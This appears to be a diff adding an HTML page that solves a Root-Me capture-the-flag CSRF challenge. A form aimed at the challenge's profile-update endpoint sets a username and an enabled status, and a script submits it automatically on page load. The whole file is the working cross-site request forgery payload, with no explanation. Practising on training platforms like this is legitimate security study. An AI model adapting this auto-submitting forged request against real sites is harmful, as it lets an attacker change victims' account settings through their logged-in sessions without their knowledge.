@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+<body>
+
+    <legend>Update Profile</legend>
+    <form id="monform" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+    <div class="form-group">
+    <label>Username:</label>
+    <input type="text" name="username" value="666">
+    </div>
+    <br>		
+    <div class="form-group">
+    <label>Status:</label>
+    <input type="checkbox" name="status" checked="">
+    </div>
+    <br>	
+    <button type="submit">Submit</button>
+    </form>
+
+<script>
+
+document.getElementById("monform").submit();
+
+    </script>	
+    
+
+</body>
+</html>
